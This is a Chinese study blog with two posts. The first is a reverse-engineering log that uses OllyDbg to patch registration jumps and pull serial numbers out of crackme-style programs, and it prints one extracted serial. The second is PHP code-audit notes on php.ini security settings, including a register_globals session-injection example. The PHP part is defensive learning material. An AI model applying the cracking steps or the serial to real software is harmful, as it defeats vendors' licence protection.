<p><img src="/2022/09/05/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-%E6%9F%90%E7%88%B1%E6%8A%80%E6%9C%AF%E5%90%A7%E7%9A%84vip%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/image-20220905141047226.png" alt="image-20220905141047226"></p>
<p>成功</p>
<p>当然也可以使用nop填充，就是直接右键nop填充。</p>
<h1 id="追出第一个注册码"><a href="#追出第一个注册码" class="headerlink" title="追出第一个注册码"></a>追出第一个注册码</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">小知识</span><br><span class="line">在od中使用搜索功能的时候，右键find nxet可以看到搜索的下一个结果</span><br><span class="line">od中提示断点损坏可以点击b然后右键激活断点</span><br><span class="line"></span><br><span class="line">左上角 : 反汇编窗口 ;</span><br><span class="line">右上角 : 寄存器窗口 ;</span><br><span class="line">左下角 : 数据窗口 ;</span><br><span class="line">右下角 : 堆栈窗口 ;</span><br></pre></td></tr></table></figure>



<p>是一个软件</p>
<p><img src="/2022/09/05/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-%E6%9F%90%E7%88%B1%E6%8A%80%E6%9C%AF%E5%90%A7%E7%9A%84vip%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/image-20220905142142695.png" alt="image-20220905142142695"></p>
<p>需要注册码，这次的目标就是这个</p>
<p>首先查壳没查到</p>
<p>然后通过搜索弹出的注册失败字符串定位到关键的跳转地方</p>
<p>设置一个断点进行一个爆破</p>
<p><img src="/2022/09/05/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-%E6%9F%90%E7%88%B1%E6%8A%80%E6%9C%AF%E5%90%A7%E7%9A%84vip%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/image-20220905152234987.png" alt="image-20220905152234987"></p>
<p>随后给他改成jne</p>
<p><img src="/2022/09/05/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-%E6%9F%90%E7%88%B1%E6%8A%80%E6%9C%AF%E5%90%A7%E7%9A%84vip%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/image-20220905152323728.png" alt="image-20220905152323728"></p>
<p>这时候就注册成功了！</p>
<p><img src="/2022/09/05/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-%E6%9F%90%E7%88%B1%E6%8A%80%E6%9C%AF%E5%90%A7%E7%9A%84vip%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/image-20220905152417992.png" alt="image-20220905152417992"></p>
<p>但是我们需要的不是这个，我们这次的目的是将文件的注册码给拖出来</p>
<p>重新运行然后断点，发现堆栈中压入了我们输入的东西和一个看着很像注册码的东西。</p>
<p>那我们就用这个试一下</p>
<p><img src="/2022/09/05/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-%E6%9F%90%E7%88%B1%E6%8A%80%E6%9C%AF%E5%90%A7%E7%9A%84vip%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/image-20220905153432443.png" alt="image-20220905153432443"></p>
<p>成功拿下！</p>
<h1 id="深入追踪注册码"><a href="#深入追踪注册码" class="headerlink" title="深入追踪注册码"></a>深入追踪注册码</h1><p>感觉还是挺有意思的，学完学滴水逆向</p>
<p>又是拿到一个程序，我还是想先爆破一下再来拖注册码。</p>
<p><img src="/2022/09/05/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-%E6%9F%90%E7%88%B1%E6%8A%80%E6%9C%AF%E5%90%A7%E7%9A%84vip%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/image-20220905154409712.png" alt="image-20220905154409712"></p>
<p><img src="/2022/09/05/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-%E6%9F%90%E7%88%B1%E6%8A%80%E6%9C%AF%E5%90%A7%E7%9A%84vip%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/image-20220905154711746.png" alt="image-20220905154711746"></p>
<p>首先还是搜索到关键跳转位置然后断点，然后改成jz。</p>
<p><img src="/2022/09/05/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-%E6%9F%90%E7%88%B1%E6%8A%80%E6%9C%AF%E5%90%A7%E7%9A%84vip%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/image-20220905154843848.png" alt="image-20220905154843848"></p>
<p>注册成功喵</p>
<p>然后关键call就是关键跳转的上面的几个之中（加个断点，卡住了就是关键call），我们进入反汇编窗口，其中的内存地址也是可以进去的，按f7或者上面暂停右边的那个按钮进入。</p>
<p>可以看到栈里面压入了我们的用户名</p>
<p><img src="/2022/09/05/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-%E6%9F%90%E7%88%B1%E6%8A%80%E6%9C%AF%E5%90%A7%E7%9A%84vip%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/image-20220905155500705.png" alt="image-20220905155500705"></p>
<p>一步一步往下走就会发现，存在一个看上去就很象注册码的东西。</p>
<p>Pict-3323ureRe-138C，用它来注册</p>
<p>再次拿下</p>
<p><img src="/2022/09/05/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-%E6%9F%90%E7%88%B1%E6%8A%80%E6%9C%AF%E5%90%A7%E7%9A%84vip%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/image-20220905155805136.png" alt="image-20220905155805136"></p>
<p>但是这里提示一下，这是一个重启验证，光是爆破之后是没有效果的，我刚才只是练习一下，我们后面可以通过修改注册表之类的操作进行修改。</p>
<h1 id="制作文件的补丁"><a href="#制作文件的补丁" class="headerlink" title="制作文件的补丁"></a>制作文件的补丁</h1><p>用工具就好</p>
<p>这傻逼电脑给我吧工具删掉了</p>
<h1 id="初识按钮事件"><a href="#初识按钮事件" class="headerlink" title="初识按钮事件"></a>初识按钮事件</h1><p>这里没有给我例子，我这里就简单的记录一下，事件过去那么就了我也不知道下面总结的对不对喵，可以更多参考后续的水滴逆向笔记</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">C++的按钮事件采用查找SUB EAX,0A</span><br><span class="line"></span><br><span class="line">DELPHI查找按钮事件 右键查找--查找二进制字符串740E8BD38B83????????FF93????????采用crtl+l键进行下翻页查找，需每一个都下上断。</span><br><span class="line"></span><br><span class="line">易语言按钮事件特征码：FF 55 fC 5F 5E</span><br><span class="line"></span><br><span class="line">UV8的按钮事件采用查找SUB EAX ,0A</span><br><span class="line"></span><br><span class="line">VB查找按钮事件是采用二进制字符串 816C2404??000000</span><br><span class="line">注意：在识别VB P-code编译时，只需要查找不到按钮事件就是P-CODE编译</span><br><span class="line"></span><br><span class="line">Ctrl+b 查找二进制字符串</span><br></pre></td></tr></table></figure>

<p>这个也就是方便我们在没有字符串的时候破解程序。</p>
<h1 id="暂停法的应用"><a href="#暂停法的应用" class="headerlink" title="暂停法的应用"></a>暂停法的应用</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.出现提示</span><br><span class="line"></span><br><span class="line">2.点击暂停</span><br><span class="line"></span><br><span class="line">3.显示关键调用</span><br><span class="line"></span><br><span class="line">4.修改破解</span><br></pre></td></tr></table></figure>

<p>还是拿到一个程序，但是没有搜索到关键字，这时候我们就可以使用暂停法。</p>
<p>例如这个</p>
<p><img src="/2022/09/05/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-%E6%9F%90%E7%88%B1%E6%8A%80%E6%9C%AF%E5%90%A7%E7%9A%84vip%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/image-20220905184429925.png" alt="image-20220905184429925"></p>
<p>就是在弹窗的时候点击暂停</p>
<p>然后按上面k键，也就是调应用堆栈的意思。</p>
<p><img src="/2022/09/05/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-%E6%9F%90%E7%88%B1%E6%8A%80%E6%9C%AF%E5%90%A7%E7%9A%84vip%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/image-20220905184613338.png" alt="image-20220905184613338"></p>
<p>这时候就可以看到应用堆栈里面存在</p>
<p>找到其中的一个messageboxa，右键，显示调用</p>
<p><img src="/2022/09/05/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-%E6%9F%90%E7%88%B1%E6%8A%80%E6%9C%AF%E5%90%A7%E7%9A%84vip%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/image-20220905184905616.png" alt="image-20220905184905616"></p>
<p>就成功来到了弹窗的地方。</p>
<p><img src="/2022/09/05/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-%E6%9F%90%E7%88%B1%E6%8A%80%E6%9C%AF%E5%90%A7%E7%9A%84vip%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/image-20220905185019983.png" alt="image-20220905185019983"></p>
<p>在下面找到调用的地方，爆破即可。</p>
<h1 id="易语言花指令的去除"><a href="#易语言花指令的去除" class="headerlink" title="易语言花指令的去除"></a>易语言花指令的去除</h1><p>首先拿到的是一个有易语言花指令的东西。</p>
<p><img src="/2022/09/05/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-%E6%9F%90%E7%88%B1%E6%8A%80%E6%9C%AF%E5%90%A7%E7%9A%84vip%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/image-20220905205155751.png" alt="image-20220905205155751"></p>
<p>我们选择插件，选择junk code插件，下面填一万</p>
<p><img src="/2022/09/05/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-%E6%9F%90%E7%88%B1%E6%8A%80%E6%9C%AF%E5%90%A7%E7%9A%84vip%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/image-20220905205322659.png" alt="image-20220905205322659"></p>
<p>这个时候就已经去除花指令了，直接用插件解决！</p>
<p><img src="/2022/09/05/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-%E6%9F%90%E7%88%B1%E6%8A%80%E6%9C%AF%E5%90%A7%E7%9A%84vip%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/image-20220905205348441.png" alt="image-20220905205348441"></p>
<p>最后就找到关键字符串爆破即可。</p>
<p><img src="/2022/09/05/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-%E6%9F%90%E7%88%B1%E6%8A%80%E6%9C%AF%E5%90%A7%E7%9A%84vip%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/image-20220905211034083.png" alt="image-20220905211034083"></p>
<h1 id="易语言非独立编译查找字符串"><a href="#易语言非独立编译查找字符串" class="headerlink" title="易语言非独立编译查找字符串"></a>易语言非独立编译查找字符串</h1><p>首先判断加壳没有</p>
<p>如果查壳显示是c++6.0  但是查找字符串是这个样子的，特别是最后一个，那么基本就可以肯定是易语言加的伪装壳。</p>
<p><img src="/2022/09/05/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-%E6%9F%90%E7%88%B1%E6%8A%80%E6%9C%AF%E5%90%A7%E7%9A%84vip%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/image-20220905212153326.png" alt="image-20220905212153326"></p>
<p>1.方法：<br>搜索字符串<br>在error字符串那里，有一个机器码，FFD0这个就是易语言永远不变的机器码。<br>找到之后断点，f7进入他，随后f8到下面这地方的时候，继续f7进入，为什么呢，因为执行到这个call的时候就弹窗说密钥不对了。</p>
<p><img src="/2022/09/05/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-%E6%9F%90%E7%88%B1%E6%8A%80%E6%9C%AF%E5%90%A7%E7%9A%84vip%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/image-20220905215418436.png" alt="image-20220905215418436"></p>
<p>进入之后找到cld汇编指令，右键他查找字符串。</p>
<p><img src="/2022/09/05/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-%E6%9F%90%E7%88%B1%E6%8A%80%E6%9C%AF%E5%90%A7%E7%9A%84vip%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/image-20220905215831449.png" alt="image-20220905215831449"></p>
<p>可以看到已经查到了。这吾爱破解也不讲原理啊。麻了。</p>
<p>这tm对面的服务器挂了，软件也没了。额。。。</p>
<p>这里就是用第一个方法吧。</p>
<p>但是不建议大伙学这个课程，直接讲如何操作，一点原理都不讲，不利于日后发展，所以笔者在这节课就没看了，改为学习比较正规的某水逆向课程。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="十三">
      <meta itemprop="description" content="潜心学习，不骄不躁">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="十三の博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/" class="post-title-link" itemprop="url">php代码审计学习笔记1</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-08-29 20:44:06" itemprop="dateCreated datePublished" datetime="2022-08-29T20:44:06+08:00">2022-08-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-12-08 01:03:24" itemprop="dateModified" datetime="2022-12-08T01:03:24+08:00">2022-12-08</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/daima/" itemprop="url" rel="index"><span itemprop="name">-daima</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="php代码审计学习笔记1"><a href="#php代码审计学习笔记1" class="headerlink" title="php代码审计学习笔记1"></a>php代码审计学习笔记1</h1><p>课程是某牛的，笔记只供个人学习</p>
<p>感觉就是从代码层面复习了一遍漏洞原理</p>
<h1 id="环境配置及审计工具介绍"><a href="#环境配置及审计工具介绍" class="headerlink" title="环境配置及审计工具介绍"></a>环境配置及审计工具介绍</h1><p>环境就用phpstudy</p>
<p>看代码的话我用的是notepad++</p>
<p>审计工具可以用seay源代码审计系统（基于正则</p>
<p>Fortify SCA也是一款不错的商业化代码审计工具（靠内置的规则空间匹配</p>
<p>rips审计工具也不错，可以看到用户输的一些点</p>
<p>以及一款数据库监控工具 vMysqlMonitoring.exe</p>
<p>审计靶场:VAuditDemo   ZVulDrill</p>
<h1 id="代码审计的思路及流程"><a href="#代码审计的思路及流程" class="headerlink" title="代码审计的思路及流程"></a>代码审计的思路及流程</h1><h2 id="MVC架构"><a href="#MVC架构" class="headerlink" title="MVC架构"></a>MVC架构</h2><p>MVC是一种设计创建Web程序的一种模式，其同时提供了HTML,CSS和JAVASCRIPT的完全控制。</p>
<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220824105406833.png" alt="image-20220824105406833"></p>
<p>MVC关系</p>
<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220824105546784.png" alt="image-20220824105546784"></p>
<h2 id="常见的php框架"><a href="#常见的php框架" class="headerlink" title="常见的php框架"></a>常见的php框架</h2><p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220824105649145.png" alt="image-20220824105649145"></p>
<h2 id="审计思路"><a href="#审计思路" class="headerlink" title="审计思路"></a>审计思路</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MVC框架常见的一个处理流程</span><br><span class="line">获取请求 全剧过滤 模块文件 c函数内容 m函数内容 v显示</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">常见网站目录架构</span><br><span class="line">主目录</span><br><span class="line"></span><br><span class="line">模块目录</span><br><span class="line">插件目录</span><br><span class="line">上传目录</span><br><span class="line">模板目录</span><br><span class="line">数据目录</span><br><span class="line">配置目录</span><br><span class="line"></span><br><span class="line">配置文件</span><br><span class="line"></span><br><span class="line">公共函数的文件</span><br><span class="line">安全过滤的文件</span><br><span class="line"></span><br><span class="line">数据库结构</span><br><span class="line"></span><br><span class="line">入口文件</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">通读全文</span><br><span class="line">函数集文件，配置文件，安全过滤文件，index文件</span><br><span class="line">优点：了解程序的架构及业务逻辑，挖掘更高质的漏洞</span><br><span class="line">缺点：耗费时间多，工程较大</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">敏感关键字回溯参数</span><br><span class="line">优点：快速挖掘想要的漏洞，最常用的方法。</span><br><span class="line">缺点：覆盖不到逻辑漏洞的挖掘，不能了解程序的基本架构</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查找可控变量</span><br><span class="line">可以用rips审计工具的查找用户输入功能</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">功能点定向审计</span><br><span class="line">程序安装，文件上传，文件管理，登录验证，备份恢复，找回密码</span><br></pre></td></tr></table></figure>

<h1 id="PHP核心配置详解"><a href="#PHP核心配置详解" class="headerlink" title="PHP核心配置详解"></a>PHP核心配置详解</h1><p>   PHP.INI配置文件也就是所谓的核心配置</p>
<p>下面是一些常亮</p>
<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220824183645573.png" alt="image-20220824183645573"></p>
<h2 id="基本配置-语法"><a href="#基本配置-语法" class="headerlink" title="基本配置-语法"></a>基本配置-语法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">大小写敏感</span><br><span class="line">directive = value（指令 = 值）</span><br><span class="line">foo=bar ≠ FOO=bar</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">运算符</span><br><span class="line">|、&amp;、~、!</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220824185643247.png" alt="image-20220824185643247"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">空值的表达方式</span><br><span class="line">foo =     ;</span><br><span class="line">foo = none;</span><br><span class="line">foo = &quot;none&quot;;这个就表示这么一个字符串了，而不是空值</span><br></pre></td></tr></table></figure>

<h2 id="基本配置-安全模式"><a href="#基本配置-安全模式" class="headerlink" title="基本配置-安全模式"></a>基本配置-安全模式</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">安全模式</span><br><span class="line">safe_mode = off</span><br><span class="line">安全模式，用来限制文档的存取、限制环境变量的存取，限制外部程序的执行。</span><br><span class="line">本特性已在PHP5.4.0被移除</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">限制环境变量存取</span><br><span class="line">safe_mode_allowed_env_vars = string</span><br><span class="line">指定php程序可以改变的环境变量的前缀，当这个选项的值为空时，那么php可以改变任何环境变量。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">外部程序执行目录</span><br><span class="line">safe_mode_exec_dir = &quot;E:\Local Test\WWW&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">禁用函数</span><br><span class="line">disable_function</span><br><span class="line">为了更安全的运行php，可以用此指令来禁止一些敏感函数的使用，当你想用本指令禁止一些危险函数时，切忌把dl()函数也加到禁止的列表，攻击者可以利用dl()函数加载自定义的php扩展来突破disable_function。配置禁用函数时可以使用逗号分隔函数名。</span><br><span class="line">同理</span><br><span class="line">disable_classes是禁用类</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">com组件</span><br><span class="line">com.allow_dcom = false</span><br><span class="line">php设置在安全模式下，仍旧允许攻击者使用com()函数来创建系统组件来执行任意命令，我推荐关闭这个函数来防止出现此漏洞。</span><br><span class="line">使用COM()函数需要在php.ini中配置extension=php_com_dotnet.dll,如果php VERSION&lt;5.4.5则不需要</span><br></pre></td></tr></table></figure>

<h2 id="基本配置-控制变量"><a href="#基本配置-控制变量" class="headerlink" title="基本配置-控制变量"></a>基本配置-控制变量</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">全局变量注册开关</span><br><span class="line">register_globals = off</span><br><span class="line">php.ini的register_globals选项的默认值预设为off，在4.2版本之前是默认开启的，当register_globals的设定为On时，程序可以接受来自服务器的各种环境变量，包括表单提交的变量，这是对服务器来讲是不安全的，所以我们不能让它注册为全局变量。</span><br><span class="line">register_globals = off时，服务器端获取数据的时候用$_GET[&#x27;name&#x27;]来获取数据</span><br><span class="line">register_globals = On时，服务器使用POST或者GET提交的变量，都将自动使用全局变量的值来接受值。</span><br><span class="line">如下：</span><br><span class="line">开启这个开关之后，我们只要传入一个_SESSION[username]=aa，就可以doeverthing</span><br><span class="line">关掉之后，我们就不能获取权限了</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220824194314976.png" alt="image-20220824194314976"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">魔术引号过滤</span><br><span class="line">magic_quotes_gpc = on  本特性已在PHP5.4.0已经移除</span><br><span class="line">magic_quotes_gpc = Off 在php.ini里面是默认关闭的，如果他打开后将自动把用户提交对sql的查询语句进行转换，如果设置成ON的话，php会吧所有的单引号，双引号，反斜杠和空字符加上反斜杠进行转义，他会影响HTTP请求的数据有(GET,POST,Cookies)，开启他会提高网站的安全性，当然，您也可以使用addslashes来转义提交的HTTP请求数据，或者用stripsashes来删除转义</span><br></pre></td></tr></table></figure>

<h2 id="基本配置-远程文件"><a href="#基本配置-远程文件" class="headerlink" title="基本配置-远程文件"></a>基本配置-远程文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">是否允许远程包含文件</span><br><span class="line">allow_url_include = off</span><br><span class="line">该配置为on的情况下，可以直接包含远程文件，若包含的变量为可控的情况下，可以直接控制变量来执行PHP代码</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">是否允许打开远程文件</span><br><span class="line">allow_url_open = on</span><br><span class="line">允许本地PHP文件通过调用URL重写来打开和关闭写权限，默认的封装协议提供的ftp和http协议来访问文件。</span><br></pre></td></tr></table></figure>

<h2 id="基本配置-目录权限"><a href="#基本配置-目录权限" class="headerlink" title="基本配置-目录权限"></a>基本配置-目录权限</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP头部版本信息</span><br><span class="line">expose_php = off</span><br><span class="line">防止了通过http头部泄露的php版本信息</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">文件上传临时目录</span><br><span class="line">upload_tmp_dir = </span><br><span class="line">上传文件临时保存目录，如果不设置的话，则采用系统的临时目录</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用户可访问目录</span><br><span class="line">open_basedir = E:\Local Test\WWW</span><br><span class="line">能够控制PHP脚本只能访问指定的目录，这样能够避免PHP脚本访问，不应该访问的文件，一定程度上限制了phpshell的危害 </span><br></pre></td></tr></table></figure>

<h2 id="基本配置-错误信息"><a href="#基本配置-错误信息" class="headerlink" title="基本配置-错误信息"></a>基本配置-错误信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">内部错误选项</span><br><span class="line">display_errors = on</span><br><span class="line">表明显示PHP脚本的内部错误，网站发布后便宜关闭PHP的错误回显，在调试的时候通常把PHP错误显示打开</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">错误报告级别</span><br><span class="line">error_reporting = E_ALL &amp; ~E_NOTICE</span><br><span class="line">这个设置的作用是将错误级别跳到最高，显示所有问题，方便排错。</span><br></pre></td></tr></table></figure>

